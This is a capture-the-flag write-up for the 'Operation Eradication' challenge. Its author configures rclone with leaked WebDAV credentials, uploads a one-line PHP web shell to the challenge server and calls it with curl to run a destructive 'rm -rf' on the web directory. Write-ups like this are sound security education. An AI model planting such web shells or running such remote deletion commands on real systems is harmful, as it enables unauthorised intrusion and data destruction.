---
title: "Operation Eradication"
description: "Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!"
author: "huntress"
date: "2023-10-14"
published: true
---

# Operation Eradication

<aside>
👻 Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!

*They stole our data!*

Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?
</aside>


We are given a webserver instance, alongside an **`operation_eradication`** file, which is plain Ascii with the following content:

```
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

We know this is a `Webdav` server, and that we can access the Webdav instance at `http://chal.ctf.games:30236/webdav`. Checking out the main page alongside the Webdav endpoint, we can see the server wants to authenticate with a `Basic` Authorization header, but no matter what we enter, we cannot access the Webdav service.

![1](/img/operation_eradication_img/Untitled.png)

![Untitled](/img/operation_eradication_img/Untitled%201.png)

![Untitled](/img/operation_eradication_img/Untitled%202.png)

We can try to do a bit of decoding/decryption, but we won’t get a hash analysis tool to give us even a guess - our `user` and `pass` strings are 72 characters long, aren’t URL-safe b64 encoded, and are generally just not going to be easily cracked.

Thankfully, we can Google the config template and find that it belongs to `Rclone`, which can be used to connect to remote Webdav servers.

Downloading Rclone, we can run through a setup of a config file, and then edit it’s contents to match the file provided:

```powershell
.\\rclone config
# run through config setup ...
Current remotes:

Name                 Type
====                 ====
huntress             webdav

# ...

s) Set configuration password
q) Quit config
e/n/d/r/c/s/q> q

# then replace it's contents with our desired config:

echo "[huntress]
type = webdav
url = http://chal.ctf.games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5" > C:\\Users\\zacwo\\AppData\\Roaming\\rclone\\rclone.conf

cat C:\\Users\\zacwo\\AppData\\Roaming\\rclone\\rclone.conf
[huntress]
type = webdav
url = http://chal.ctf.games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Next, lets try listing the Webdav’s contents to see if our configuration works:

```powershell
.\\rclone tree huntress:
/
├── Accounting
│   ├── 2021
│   │   └── AnnualReport.pdf
│   ├── 2022
│   │   ├── Quarter1_MonthlyRevenue.xlsx
# ...
│   └── Training
│       ├── 2022
│       │   ├── AdvancedSalesSkillsCourse.pdf
│       │   └── NewSalesRepTraining.pdf
│       └── SalesTrainingManual.pdf
```

Looks like its functional. Unfortunately, we can’t just `.\\rclone delete huntress:/` - I guess some kind of backend configuration on the remote machine stops us from doing this - we do, however, have write permissions, and can upload files to the machine.

As with any PHP service, we may be able to gain code execution as `www-data` (who would usually have ownership of `/var/www/html/`) so my immediate thoughts were that it might be possible to execute code through malicious PHP.

We tragically can’t execute commands from our Rclone shell, so we’ll have to try to run something from the HTTP service. As the service is publicly available, only requires a single command, and honestly I don’t feel like spinning up `ngrok` tunnels, we can just use a PHP `cmd` script:

```php
// written to 'exec.php':

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

```powershell
.\\rclone copy C:\\...\\exec.php huntress:/
.\\rclone ls huntress:/
       50 exec.php
  1745724 ProductDevelopment/2022/ProductRoadmap.pdf
  3570194 ProductDevelopment/2023/ProductRoadmap.pdf
  3510400 HumanResources/EmployeeHandbook.pdf
  7680849 ProductDevelopment/Specifications/NewProductSpecs.pdf
  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs.pdf
  ...
```

We still don’t know how to Auth, so we can try to intercept the `Rclone`↔ `Webdav` traffic with `Wireshark`:

```powershell
PROPFIND /webdav/ HTTP/1.1
Host: chal.ctf.games:30236
User-Agent: rclone/v1.64.2
Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz
Depth: 1
Referer: http://chal.ctf.games:30236/webdav/
Accept-Encoding: gzip
```

Finally, we can use `curl` to execute `bash -c "rm -rf <[the webdav endpoint]>...";`  as a `GET` param passed to the `exec.php` file we just uploaded - I’ve included an additional `echo 'done'` command after running `rm -rf` just as a sanity check, so we know we’re executing a command given the lack of feedback.

Essentially, we are querying the URI `http://chal.ctf.games:30236/webdav/test/exec.php?cmd=bash+-c+\\"rm+-rf+/var/www/html/webdav/*;+echo+\\'done.\\'\\"` while supplying the header info expected for such an HTTP request:

```bash
	curl -i -s -k -X $'GET' \\
    -H $'Host: localhost' -H $'User-Agent: rclone/v1.64.2' \\
    -H $'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz' \\
		-H $'Depth: 1' -H $'Referer: http://chal.ctf.games:30236/webdav/' -H $'Accept-Encoding: gzip' -H $'Content-Type: application/x-httpd-php' \\
    $'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+\\"rm+-rf+/var/www/html/webdav/*;+echo+\\'done.\\'\\"'
```

```php
curl -i -s -k -X $'GET' \\
    -H $'Host: localhost' -H $'User-Agent: rclone/v1.64.2' \\
    -H $'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz' \\
		-H $'Depth: 1' -H $'Referer: http://chal.ctf.games:30236/webdav/' -H $'Accept-Encoding: gzip' -H $'Content-Type: application/x-httpd-php' \\
    $'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+\\"rm+-rf+/var/www/html/webdav/*;+echo+\\'done.\\'\\"'

HTTP/1.1 200 OK
Date: Fri, 20 Oct 2023 18:24:02 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Encoding: gzip
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

Refreshing the webapp's root directory, we get our flag:

![Untitled](/img/operation_eradication_img/Untitled%203.png)

